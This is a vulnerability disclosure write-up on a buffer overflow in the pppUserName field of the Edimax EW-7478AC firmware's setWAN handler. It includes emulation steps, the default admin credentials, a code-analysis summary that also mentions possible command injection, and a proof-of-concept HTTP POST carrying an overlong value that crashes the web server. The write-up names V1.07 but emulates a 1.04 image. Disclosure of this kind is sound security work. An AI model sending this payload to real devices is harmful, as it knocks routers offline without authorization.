## **Description**

A buffer overflow vulnerability was discovered in the Edimax EW-7478AC firmware version ​**V1.07**. The vulnerability arises from the improper input validation of the `pppUserName` parameter in the 'setWAN' interface of the file webs.

## ​**Affected Product**

- ​**Brand**: EDIMAX
- ​**Product**: EW-7478AC
- ​**Version**: V1.07

The firmware can be downloaded from the official website.  
The vulnerability was confirmed using ​**FirmAE** for firmware emulation:

```sh
sudo ./run.sh -d Edimax ../FIRMWARE/EW7478APC_1.04.bin
```

**Default credentials**:

- ​**Username**: `admin`
- ​**Password**: `1234`

The result of the simulation is as follows: 
![sim_res](./img/sim_res.png)

## ​**Vulnerability Analysis**

### ​**Key Vulnerable Code**

Using ghidra we known that the vulnerability code in function 'setWAN' is below:
![vulner_code.png](./img/vulner_code.png)

- ​**websGetVar** retrieves POST parameters.
- ​**strcpy()**, **sprintf()** is used without length checks, leading to a ​buffer overflow.
- **system()** is used without check, so there may be a command injection in this place


## **Proof of Concept (PoC)**

### ​**Exploit Request**
We use burpsuite to capture a normal POST packet for test.
Example package
```http
POST /goform/setWAN HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 332
Connection: close

wanMode=2&pppUserName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&pppPassword=test123
```

After the request the `webs` process will crash.
![result](./img/result.png)